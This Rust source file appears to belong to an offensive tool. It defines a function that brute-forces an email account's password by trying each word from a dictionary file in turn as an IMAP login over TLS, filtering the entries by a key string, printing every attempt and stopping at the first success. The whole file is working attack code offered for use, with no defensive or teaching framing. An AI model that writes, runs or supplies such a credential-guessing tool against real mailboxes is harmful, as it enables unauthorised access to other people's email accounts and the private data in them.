//std
use std::path::Path;
use std::process::exit;

// local
use crate::func::{pause, read_lines};

// mod


pub fn brute_mail(mail: String, dictionary: String, key: String, imap_address: String) {
    if mail != "" && dictionary != "" && imap_address != "" {
        if Path::new(dictionary.trim()).exists() {
            if let Ok(lines) = read_lines(dictionary.trim()) {
                let mut list_word = vec![String::from("")];
                if let Ok(lines) = read_lines(dictionary.trim()) {
                    let mut attempt = 0;
                    for line in lines {
                        if let Ok(pass) = line {
                            if pass.contains(&key) && list_word[attempt] != pass {
                                let tls = native_tls::TlsConnector::builder().build().unwrap();
                                let client = imap::connect((imap_address.as_str(), 993), imap_address.as_str(), &tls).unwrap();
                                list_word.push(pass.clone());
                                attempt += 1;
                                match client.login(mail.clone(), pass.clone()) {
                                    Ok(_) => {
                                        println!("[!] [TRIED] => SUCCESS | [PASSWORD] => {}, [E-MAIL] => {}, ATTEMPT => {}", &pass, mail, attempt);
                                        pause();
                                        break;
                                    }
                                    Err(_) => {
                                        println!("[!] [TRIED] => FALSE | [PASSWORD] => {}, [E-MAIL] => {}, ATTEMPT => {}", &pass, mail, attempt);
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                println!("[!] [ERROR] The file ({:?}) You put does not exist :/", dictionary);
                pause();
            }
        } else {
            println!("[!] [ERROR] Please complete all fields ...");
            pause();
        }
        exit(0);
    }
}
